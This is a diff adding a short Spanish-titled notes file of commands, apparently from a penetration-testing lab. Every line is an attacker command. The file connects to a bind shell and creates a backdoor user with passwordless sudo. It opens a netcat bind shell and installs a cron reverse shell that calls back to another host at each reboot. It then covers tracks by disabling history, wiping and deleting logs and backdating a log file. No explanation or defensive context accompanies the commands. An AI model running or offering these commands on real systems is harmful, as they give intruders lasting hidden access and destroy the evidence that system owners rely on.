@@ -1,0 +1,11 @@
+# Día 2 – Comandos usados
+nc -vn 192.168.42.129 1524
+useradd -m -s /bin/bash auditor
+passwd auditor
+echo "auditor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+nc -lvnp 443 -e /bin/bash &
+(crontab -l 2>/dev/null; echo "@reboot sleep 30 && nc -nv 192.168.42.128 9001 -e /bin/bash") | crontab -
+export HISTFILE=/dev/null
+cat /dev/null > /var/log/auth.log
+rm -f /var/log/vsftpd.log
+touch -t 200801120000 /var/log/auth.log
